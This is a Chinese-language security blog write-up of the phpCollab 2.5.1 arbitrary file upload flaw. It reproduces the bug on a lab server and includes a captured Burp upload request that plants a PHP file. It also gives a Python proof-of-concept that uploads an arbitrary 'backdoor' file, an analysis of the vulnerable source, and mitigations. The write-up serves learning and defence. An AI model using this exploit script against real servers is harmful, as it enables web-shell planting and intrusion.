---
title: phpCollab 2.5.1 - Arbitrary File Upload
date: 2017-10-13 10:43:04
tags:
		- 
categories:
		- 安全研究	
---

`phpCollab 2.5.1 - Arbitrary File Upload`漏洞的学习。

<!-- more -->



##### [phpCollab 2.5.1 - Arbitrary File Upload](https://www.exploit-db.com/exploits/42934/)


##### 背景介绍

看到`phpcollab`被爆出一个任意文件上传漏洞，下载下来测试学习一下，其中的漏洞利用，poc的编写，以及代码产生漏洞的原因。

[下载phpcollab](https://www.exploit-db.com/apps/dda41c5b541d7adc0b50b1fcf3bf7519-phpCollab-v2.5.1.zip)

直接在自己搭建的服务器上安装就行了。

##### 复现

必须注册一个账户，登录后台里面。在客户--客户组织--编辑处，上传文件的地方存在任意文件上传漏洞。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-12/79648453.jpg)

在标志处，需要上传文件。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-12/79648453.jpg)


F12--查看该标志文件的地址，知道在`"../logos_clients/`目录下面。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-12/91535998.jpg)


直接上传就可以，Burpsuite抓包，看一下。

	POST /phpcollab/clients/editclient.php?id=2&action=update&PHPSESSID=sos714moqg2obs6sc24p55hko1 HTTP/1.1
	Host: 192.168.86.194
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate
	Content-Type: multipart/form-data; boundary=---------------------------17918258359334
	Content-Length: 1162
	Referer: http://192.168.86.194/phpcollab/clients/editclient.php?id=2&PHPSESSID=sos714moqg2obs6sc24p55hko1
	Cookie: tvfe_search_uid=258421f8-2e1a-4028-bed3-f686ba62c586; PHPSESSID=sos714moqg2obs6sc24p55hko1
	Connection: close
	Upgrade-Insecure-Requests: 1
	
	-----------------------------17918258359334
	Content-Disposition: form-data; name="MAX_FILE_SIZE"
	
	100000000
	-----------------------------17918258359334
	Content-Disposition: form-data; name="cn"
	
	test
	-----------------------------17918258359334
	Content-Disposition: form-data; name="add"
	
	test
	-----------------------------17918258359334
	Content-Disposition: form-data; name="client_phone"
	
	11111111
	-----------------------------17918258359334
	Content-Disposition: form-data; name="url"
	
	1111111
	-----------------------------17918258359334
	Content-Disposition: form-data; name="email"
	
	11111111234@sina.com
	-----------------------------17918258359334
	Content-Disposition: form-data; name="comments"
	
	
	-----------------------------17918258359334
	Content-Disposition: form-data; name="hourly_rate"
	
	111.00
	-----------------------------17918258359334
	Content-Disposition: form-data; name="upload"; filename="test.php"
	Content-Type: application/octet-stream
	
	<?php phpinfo();?>
	-----------------------------17918258359334
	Content-Disposition: form-data; name="extensionOld"
	
	txt
	-----------------------------17918258359334--


我们通过标志处，就可以知道上传的文件被重新命令了，但还是php后缀。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-12/83332319.jpg)


很多时候都是上传后的文件，路径找不到，或者文件名字被修改。但这次顺利通过其源码可以找到，然后访问。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-12/86380888.jpg)

##### POC编写

知道一个漏洞后，想着要自动化或者提高效率，需要写一个脚本来实现其中的功能。

POC已经给出了，学习一下其中的原理。利用`requests`实现文件的上传。

	#!/usr/bin/python
	# -*- coding:utf-8 -*-
	
	import os
	import sys 
	import requests
	
	if __name__ == '__main__':
	    if(len(sys.argv) !=4):
	        print("Enter your target,userid and path for file upload like: python phpcollab.py http://127.0.0.1/phpcollab/ 2 C:\Users\Administrator\Desktop\test.php")  #使用方法
	        
	    target = '%s/clients/editclient.php?id=%s&action=update' %(sys.argv[1],sys.argv[2]) 
	    #sys.argv[1] 第二个参数，目标地址，sys.argv[2] userid
	    print("[*] Trying to exploit with URL: %s..." % target)
	    backdoor = {'upload':open(sys.argv[3],'rb')}  #读取上传的文件内容，字典形式，键upload
	    r = requests.post(target,files=backdoor) #requests.post 上传文件
	    extension = os.path.splitext(sys.argv[3])[1] #取后缀名
	    link = "%s/logos_clients/%s%s" % (sys.argv[1],sys.argv[2],extension) #上传后文件的路径
	    r = requests.get(link)
	    if r.status_code == 200:  #判断是否上传成功
	        print("[OK] Backdoor link: %s" % link)
	    else:
	        print("[FAIL]Problem(status:%s) (link:%s)" % (r.status_code,link))
	        

利用，可以上传成功。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-10-12/89045811.jpg)

##### 漏洞分析

利用以及poc完成之后，开始从源代码分析，是哪里出现了问题。
出现漏洞的代码在 `\clients\editclient.php`里面，这就是对客户信息修改的代码文件。

	//case update client organization
	if ($id != "") 
	{
		if ($action == "update") 
		{
			if ($logoDel == "on") 
			{
				$tmpquery = "UPDATE ".$tableCollab["organizations"]." SET extension_logo='' WHERE id='$id'"; //内容的更新
				connectSql("$tmpquery");
				@unlink("../logos_clients/".$id.".$extensionOld");  #删除旧的文件
			}
	
			$extension = strtolower( substr( strrchr($_FILES['upload']['name'], ".") ,1) ); 
		// 后缀名字 substr(string,start,length)，但是没有对其进行过滤。
	
			if(@move_uploaded_file($_FILES['upload']['tmp_name'], "../logos_clients/".$id.".$extension")) 
	            //move_uploaded_file() 函数将上传的文件移动到新位置。
			{
				chmod("../logos_clients/".$id.".$extension",0666);
				$tmpquery = "UPDATE ".$tableCollab["organizations"]." SET extension_logo='$extension' WHERE id='$id'";
				connectSql("$tmpquery");
			}


##### 任意文件上传漏洞修复

1. 对上传文件格式限制，只允许某些格式文件上传。使用白名单
2. 对文件格式进行校验，前端和服务器端都需要校验。
3. 将上传文件的目录，设置权限。一般上传的都是静态文件，所以需要对其目录设置禁止执行权限。
4. 将上传的文件的名字进行随机命名。


##### 参考

[phpCollab 2.5.1 - Arbitrary File Upload](https://www.exploit-db.com/exploits/42934/)

[文件上传漏洞常见利用方式分析](https://www.2cto.com/article/201602/490414.html)

[攻防：文件上传漏洞的攻击与防御](http://www.h3c.com/cn/d_201408/839582_30008_0.htm)

[文件上传下载漏洞](http://blog.csdn.net/worn_xiao/article/details/52357167)

[文件上传检测的多种绕过姿势](http://blog.csdn.net/c465869935/article/details/51800354)

[文件上传漏洞（绕过姿势）](https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/)
